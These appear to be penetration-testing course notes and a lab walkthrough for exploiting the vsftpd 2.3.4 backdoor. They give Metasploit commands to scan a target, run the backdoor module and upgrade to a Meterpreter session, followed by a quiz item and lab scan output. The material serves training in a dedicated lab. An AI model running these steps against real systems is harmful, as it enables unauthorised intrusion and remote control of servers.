
- Port 21
- File Transfer Protocol
- File transfers between nodes
- vsftpd - Type of FTP server run on Linux Systems
- vsftpd V2.3.4 has a command execution vuln


Setup msfconsole
```
service postgresql start
msfconsole
workspace -a vsftpd 
setg RHOSTS <target_ip>
```

Scan and enumerate target ip address
```
db_nmap -sS -sV -O <target_ip>
```

Search for exploit
```
search vsftpd 
```

Setup exploit
```
use exploit/unix/ftp/vsftpd_234_backdoor 
options
exploit
```

Upgrade to meterpreter session
```
use post/multi/manage/shell_to_meterpreter
options
set LHOST <local_ip>
set LPORT <local_port>
set SESSSION <session_id>
exploit
```

Confirm sessions are open
```
sessions 
sessions <session_id>
```
## Quiz

What version of VSFTPD is vulnerable to backdoor command execution?

	V2.3.4
## Lab

The target server as described below is running a vulnerable FTP server. Your task is to fingerprint the application using command line tools available on the Kali terminal and then exploit the application using the appropriate Metasploit module. Get a Meterpreter shell on the target!

Instructions:Â 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- postgresql is not running by default so Metasploit may give you an error about this when starting


```
192.112.130.3
```

```
db_nmap -sS -sV -O 192.112.130.3

21/tcp open  ftp     vsftpd 2.3.4
```

```
nmap -sS -sV -sC demo.ine.local

21/tcp open  ftp     vsftpd 2.3.4
```